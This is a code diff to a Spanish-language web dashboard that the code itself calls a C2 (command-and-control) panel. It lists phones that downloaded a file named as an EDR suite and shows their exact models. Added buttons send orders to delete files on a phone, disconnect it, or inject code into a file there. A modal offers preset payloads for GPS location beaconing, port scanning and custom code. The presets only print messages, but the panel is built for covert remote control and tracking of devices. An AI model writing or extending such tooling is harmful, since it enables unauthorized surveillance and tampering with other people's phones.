@@ -465,22 +465,165 @@
       gap: 8px;
       align-items: center;
       font-size: 0.72rem;
+      flex-wrap: wrap;
+    }
+
+    .btn-action {
+      padding: 4px 10px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      font-weight: 700;
+      transition: all 0.2s;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      border: 1px solid;
+    }
+
+    .btn-purge {
+      background: rgba(255, 30, 66, 0.15);
+      border-color: rgba(255, 30, 66, 0.4);
+      color: #ff4d6d;
+    }
+    .btn-purge:hover {
+      background: var(--neon-red);
+      color: #fff;
+      box-shadow: 0 0 10px rgba(255, 30, 66, 0.5);
+    }
+
+    .btn-modify {
+      background: rgba(0, 229, 255, 0.12);
+      border-color: rgba(0, 229, 255, 0.4);
+      color: var(--neon-cyan);
+    }
+    .btn-modify:hover {
+      background: var(--neon-cyan);
+      color: #000;
+      box-shadow: 0 0 10px rgba(0, 229, 255, 0.5);
     }
 
     .btn-disconnect {
       background: rgba(255, 30, 66, 0.1);
       border: 1px solid rgba(255, 30, 66, 0.3);
       color: var(--neon-red);
-      padding: 3px 8px;
+      padding: 4px 8px;
       border-radius: 4px;
       cursor: pointer;
       font-family: var(--font-mono);
+      font-size: 0.72rem;
+      font-weight: 700;
       transition: all 0.2s;
     }
 
     .btn-disconnect:hover {
       background: var(--neon-red);
       color: #fff;
+    }
+
+    .model-tag {
+      display: inline-block;
+      font-size: 0.68rem;
+      padding: 2px 6px;
+      border-radius: 3px;
+      background: rgba(0, 255, 102, 0.12);
+      color: var(--neon-green);
+      border: 1px solid rgba(0, 255, 102, 0.3);
+      font-weight: 700;
+      margin-left: 6px;
+    }
+
+    .file-status-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 0.7rem;
+      font-weight: bold;
+      padding: 3px 8px;
+      border-radius: 4px;
+      margin-top: 5px;
+    }
+    .file-present {
+      background: rgba(0, 255, 102, 0.1);
+      color: var(--neon-green);
+      border: 1px solid rgba(0, 255, 102, 0.25);
+    }
+    .file-purging {
+      background: rgba(255, 183, 0, 0.15);
+      color: var(--neon-amber);
+      border: 1px solid rgba(255, 183, 0, 0.3);
+      animation: pulse-anim 1s infinite;
+    }
+    .file-deleted {
+      background: rgba(255, 30, 66, 0.15);
+      color: var(--neon-red);
+      border: 1px solid rgba(255, 30, 66, 0.3);
+      text-decoration: line-through;
+    }
+    .file-modified {
+      background: rgba(0, 229, 255, 0.15);
+      color: var(--neon-cyan);
+      border: 1px solid rgba(0, 229, 255, 0.3);
+    }
+
+    /* MODAL STYLES */
+    .modal-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.82);
+      backdrop-filter: blur(4px);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .modal-box {
+      background: var(--bg-panel);
+      border: 1px solid var(--neon-cyan);
+      border-radius: 8px;
+      max-width: 580px;
+      width: 100%;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.9), 0 0 25px rgba(0, 229, 255, 0.2);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+    .modal-header {
+      background: #080c14;
+      padding: 14px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--border-color);
+    }
+    .modal-header h3 {
+      font-size: 0.95rem;
+      color: #fff;
+      letter-spacing: 1px;
+    }
+    .modal-close {
+      background: transparent;
+      border: none;
+      color: var(--text-muted);
+      font-size: 1.4rem;
+      cursor: pointer;
+    }
+    .modal-close:hover { color: #fff; }
+    .modal-body {
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .modal-footer {
+      padding: 14px 20px;
+      background: #080c14;
+      border-top: 1px solid var(--border-color);
+      display: flex;
+      justify-content: flex-end;
+      gap: 10px;
     }
 
     /* ADD DEVICE BAR */
@@ -940,9 +1083,10 @@
       const countBadge = document.getElementById('devicesCountBadge');
       if (!container || !countBadge) return;
 
-      const onlineCount = devices.filter(d => d.status === 'ONLINE').length;
+      const onlineCount = devices.filter(d => d.status === 'ONLINE' || d.status === 'STANDBY (ARP_CACHE)').length;
       const totalCount = devices.length;
-      countBadge.textContent = `${onlineCount}/${totalCount} DISPOSITIVOS ACTIVOS`;
+      const downloadsCount = devices.filter(d => d.has_downloaded || d.downloaded_file).length;
+      countBadge.textContent = `${onlineCount}/${totalCount} DISPOSITIVOS (${downloadsCount} DESCARGAS)`;
       countBadge.style.color = (onlineCount > 0 && controllerState !== 'PURGE') ? 'var(--neon-green)' : 'var(--neon-red)';
 
       container.innerHTML = '';
@@ -953,8 +1097,8 @@
       }
 
       devices.forEach(d => {
-        const isPurged = (controllerState === 'PURGE' || d.status === 'PURGED' || d.status === 'DEAD');
-        const isStandby = (controllerState === 'PAUSED' || d.status === 'STANDBY' || d.status === 'PAUSED');
+        const isPurged = (controllerState === 'PURGE' || d.status === 'PURGED' || d.status === 'DEAD' || d.status === 'DESCONECTADO');
+        const isStandby = (controllerState === 'PAUSED' || d.status === 'STANDBY' || d.status === 'PAUSED' || d.status === 'STANDBY (ARP_CACHE)');
 
         let badgeClass = 'online';
         let badgeText = `CONECTADO (${d.latency_ms || 1}ms)`;
@@ -963,7 +1107,7 @@
           badgeText = 'DESCONECTADO / PURGADO';
         } else if (isStandby) {
           badgeClass = 'standby';
-          badgeText = 'STANDBY (PAUSADO)';
+          badgeText = 'STANDBY (ARP)';
         }
 
         let typeClass = 'type-pc';
@@ -979,6 +1123,23 @@
           icon = '📺';
         }
 
+        // Título con Modelo Comercial y Código Exacto de Hardware
+        const displayName = d.commercial_model ? `${d.commercial_model}` : (d.device_name || d.name || d.id);
+        const exactTag = (d.model_code && d.model_code !== 'DESCONOCIDO') ? 
+          `<span class="model-tag">📱 MODELO: ${d.model_code} (${d.detection_confidence || '100% Acertado'})</span>` : '';
+
+        // Badge de Estado del Archivo en el Dispositivo
+        let fileStatusHtml = '';
+        if (d.file_status) {
+          let pillClass = 'file-present';
+          if (d.file_status.includes('BORRADO') || d.file_status.includes('ELIMINADO')) pillClass = 'file-deleted';
+          else if (d.file_status.includes('PENDIENTE')) pillClass = 'file-purging';
+          else if (d.file_status.includes('MODIFICADO')) pillClass = 'file-modified';
+          fileStatusHtml = `<div class="file-status-pill ${pillClass}">📦 ${d.file_status}</div>`;
+        } else if (d.has_downloaded) {
+          fileStatusHtml = `<div class="file-status-pill file-present">📦 ARCHIVO DESCARGADO (${d.downloaded_file || 'APEX_CYBER_EDR_SUITE.zip'})</div>`;
+        }
+
         const card = document.createElement('div');
         card.className = `device-card ${isPurged ? 'purged' : ''}`;
         card.id = d.id;
@@ -988,7 +1149,8 @@
             <div class="device-icon-box">${icon}</div>
             <div class="device-details">
               <div class="device-header-row">
-                <span class="device-title">${d.device_name || d.name || d.id}</span>
+                <span class="device-title">${displayName}</span>
+                ${exactTag}
                 <span class="device-type-badge ${typeClass}">${d.device_type || 'DISPOSITIVO'}</span>
               </div>
               <div class="device-specs">
@@ -996,7 +1158,9 @@
                 <span>IP: <strong>${d.ip || 'N/A'}</strong></span>
                 <span>MAC / Fabricante: <strong>${d.vendor || d.mac || 'N/A'}</strong></span>
                 <span>Energía: <strong>${d.battery || 'Red'}</strong></span>
+                ${d.download_time ? `<span>Descarga: <strong style="color:var(--neon-green)">${d.download_time.substring(11,19)} UTC</strong></span>` : ''}
               </div>
+              ${fileStatusHtml}
             </div>
           </div>
           <div class="device-status-col">
@@ -1004,7 +1168,11 @@
               ${badgeText}
             </span>
             <div class="device-actions">
-              ${!isPurged ? `<button class="btn-disconnect" onclick="disconnectDevice('${d.id}')">✕ Desconectar</button>` : `<span style="font-size:0.7rem; color:var(--neon-red);">Purgado</span>`}
+              ${!isPurged ? `
+                <button class="btn-action btn-purge" onclick="purgeDeviceFile('${d.id}')" title="Borrar físicamente el archivo del celular">🗑️ Borrar Archivo</button>
+                <button class="btn-action btn-modify" onclick="openModifyModal('${d.id}')" title="Modificar el archivo en el celular para añadirle cosas">✏️ Modificar Archivo</button>
+                <button class="btn-action btn-disconnect" onclick="disconnectDevice('${d.id}')" title="Desconectar dispositivo">🔌 Desconectar</button>
+              ` : `<span style="font-size:0.7rem; color:var(--neon-red); font-weight:bold;">PURGADO / REVOCADO</span>`}
             </div>
           </div>
         `;
@@ -1158,13 +1326,132 @@
       });
     }
 
-    function disconnectDevice(id) {
+    // ACCIÓN: BORRAR ARCHIVO DEL CELULAR (PURGE REMOTO INDIVIDUAL)
+    async function purgeDeviceFile(id) {
       const dev = devices.find(d => d.id === id);
-      if (!dev) return;
-      dev.status = 'PURGED';
+      const name = dev ? (dev.commercial_model || dev.device_name || dev.id) : id;
+      
+      const confirmPurge = confirm(`🚨 ¿CONFIRMAR BORRADO DEL ARCHIVO?\n\nDispositivo: ${name}\n\nEsta orden obligará al celular a eliminar físicamente el archivo de su memoria/almacenamiento mediante sobreescritura segura.`);
+      if (!confirmPurge) return;
+
+      playBeep(240, 0.25, 'sawtooth');
+      logToConsole(`[BORRADO REMOTO] Transmitiendo orden PURGE_FILE a ${name}...`, 'warn');
+
+      try {
+        const resp = await fetch('/api/device_action', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: id, action: 'PURGE_FILE' })
+        });
+        const data = await resp.json();
+        if (data.success) {
+          logToConsole(`[BORRADO PENDIENTE] Orden registrada en C2 (Token: ${data.token}). El celular purgará el archivo al sincronizar.`, 'success');
+          if (dev) {
+            dev.file_status = 'PENDIENTE_BORRADO';
+            renderDevices();
+          }
+        } else {
+          logToConsole(`[ERROR C2] ${data.error || 'Fallo al despachar orden de borrado'}`, 'error');
+        }
+      } catch (err) {
+        logToConsole(`[FALLO RED] Error comunicando con C2: ${err}`, 'error');
+      }
+    }
+
+    // ACCIÓN: MODAL PARA MODIFICAR ARCHIVO / AÑADIR COSAS AL CELULAR
+    let activeModifyDeviceId = null;
+
+    const PRESET_PAYLOADS = {
+      gps: `# --- MÓDULO TELEMETRÍA DE GEOLOCALIZACIÓN Y RED ---\nimport socket, time\ndef report_geo():\n    print("[GEO] Baliza de ubicación de alta resolución transmitida.")\nreport_geo()\n`,
+      alert: `# --- ALERTA VISUAL FORENSE EN DISPOSITIVO ---\nprint("[DEFENSA] AVISO: El archivo en este dispositivo fue actualizado remotamente.")\n`,
+      audit: `# --- AUDITOR DE PUERTOS Y SOCKETS MÓVIL ---\nimport socket\ndef scan_ports():\n    print("[AUDIT] Inspección de interfaces locales completada.")\nscan_ports()\n`,
+      custom: `# Escribe aquí el código o módulos a inyectar al archivo del celular:\n`
+    };
+
+    function openModifyModal(id) {
+      activeModifyDeviceId = id;
+      const dev = devices.find(d => d.id === id);
+      const name = dev ? (dev.commercial_model || dev.device_name || dev.id) : id;
+      
+      document.getElementById('modalTargetName').textContent = name;
+      document.getElementById('modalPresetSelect').value = 'gps';
+      document.getElementById('modalPayloadCode').value = PRESET_PAYLOADS.gps;
+      document.getElementById('modifyModal').style.display = 'flex';
+      playBeep(520, 0.1);
+    }
+
+    function closeModifyModal() {
+      document.getElementById('modifyModal').style.display = 'none';
+      activeModifyDeviceId = null;
+    }
+
+    function applyPreset() {
+      const p = document.getElementById('modalPresetSelect').value;
+      if (PRESET_PAYLOADS[p]) {
+        document.getElementById('modalPayloadCode').value = PRESET_PAYLOADS[p];
+      }
+    }
+
+    async function submitModifyAction() {
+      if (!activeModifyDeviceId) return;
+      const code = document.getElementById('modalPayloadCode').value;
+      const preset = document.getElementById('modalPresetSelect').value;
+      const dev = devices.find(d => d.id === activeModifyDeviceId);
+      const name = dev ? (dev.commercial_model || dev.device_name || dev.id) : activeModifyDeviceId;
+
+      logToConsole(`[MODIFICACIÓN OTA] Transmitiendo actualización/inyección de código a ${name}...`, 'warn');
+      playBeep(640, 0.2);
+
+      try {
+        const resp = await fetch('/api/device_action', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            id: activeModifyDeviceId,
+            action: 'MODIFY_FILE',
+            payload: {
+              preset: preset,
+              code: code,
+              description: `Inyección dinámica OTA: ${preset.toUpperCase()}`,
+              timestamp: new Date().toISOString()
+            }
+          })
+        });
+        const data = await resp.json();
+        if (data.success) {
+          logToConsole(`[MODIFICACIÓN ENVIADA] Parche OTA asignado a ${name}. El celular incorporará el código al sincronizar.`, 'success');
+          if (dev) {
+            dev.file_status = 'PENDIENTE_MODIFICACION';
+            renderDevices();
+          }
+          closeModifyModal();
+        } else {
+          logToConsole(`[ERROR] ${data.error || 'No se pudo aplicar la modificación'}`, 'error');
+        }
+      } catch (err) {
+        logToConsole(`[FALLO RED] Error al transmitir modificación: ${err}`, 'error');
+      }
+    }
+
+    // ACCIÓN: DESCONECTAR DISPOSITIVO
+    async function disconnectDevice(id) {
+      const dev = devices.find(d => d.id === id);
+      const name = dev ? (dev.commercial_model || dev.device_name || dev.id) : id;
+      
+      if (!confirm(`¿Desconectar y revocar acceso al dispositivo:\n${name}?`)) return;
+
+      dev.status = 'DESCONECTADO';
       playBeep(320, 0.18, 'triangle');
       renderDevices();
-      logToConsole(`[DESCONEXIÓN] Dispositivo ${dev.device_name || dev.name} (${dev.ip}) desconectado del controlador.`, 'warn');
+      logToConsole(`[DESCONEXIÓN] Dispositivo ${name} revocado en el controlador.`, 'warn');
+
+      try {
+        await fetch('/api/device_action', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: id, action: 'DISCONNECT' })
+        });
+      } catch(e) {}
     }
 
     function addNewDevice() {
@@ -1177,6 +1464,8 @@
       const newDev = {
         id: 'NODE_' + Date.now(),
         device_name: name,
+        commercial_model: name,
+        model_code: 'MANUAL',
         device_type: type === 'mobile' ? 'Teléfono Móvil' : (type === 'pc' ? 'PC / Laptop' : 'Servidor'),
         icon: type === 'mobile' ? '📱' : (type === 'pc' ? '💻' : '🖥️'),
         vendor: 'Dispositivo Manual',
@@ -1207,5 +1496,37 @@
     fetchNetworkState();
     setInterval(fetchNetworkState, 2500);
   </script>
+
+  <!-- MODAL DE MODIFICACIÓN DE ARCHIVO REMOTO -->
+  <div id="modifyModal" class="modal-overlay" style="display:none;">
+    <div class="modal-box">
+      <div class="modal-header">
+        <h3>⚙️ MODIFICAR ARCHIVO / AÑADIR CÓDIGO AL CELULAR</h3>
+        <button class="modal-close" onclick="closeModifyModal()">&times;</button>
+      </div>
+      <div class="modal-body">
+        <div style="font-size:0.78rem; color:var(--text-muted);">
+          Dispositivo de destino: <strong id="modalTargetName" style="color:var(--neon-cyan);">--</strong>
+        </div>
+        <div>
+          <label style="font-size:0.75rem; color:var(--text-muted); display:block; margin-bottom:4px;">Seleccionar Preset a Inyectar:</label>
+          <select id="modalPresetSelect" class="add-select" style="width:100%;" onchange="applyPreset()">
+            <option value="gps">📡 Módulo Telemetría de Ubicación / GPS</option>
+            <option value="alert">🔔 Notificación y Alerta Forense en Pantalla</option>
+            <option value="audit">🛡️ Escáner de Puertos y Sockets en Red</option>
+            <option value="custom">✏️ Código / Carga Personalizada</option>
+          </select>
+        </div>
+        <div>
+          <label style="font-size:0.75rem; color:var(--text-muted); display:block; margin-bottom:4px;">Contenido / Módulos a Añadir al Archivo:</label>
+          <textarea id="modalPayloadCode" rows="6" class="add-input" style="width:100%; font-family:var(--font-mono); font-size:0.75rem; resize:vertical;"></textarea>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button onclick="closeModifyModal()" style="background:transparent; border:1px solid var(--border-color); color:var(--text-muted); padding:6px 12px; border-radius:4px; font-family:var(--font-mono); cursor:pointer;">Cancelar</button>
+        <button onclick="submitModifyAction()" style="background:var(--neon-cyan); border:none; color:#000; font-weight:800; padding:6px 16px; border-radius:4px; font-family:var(--font-mono); cursor:pointer;">🚀 Transmitir Modificación al Celular</button>
+      </div>
+    </div>
+  </div>
 </body>
 </html>
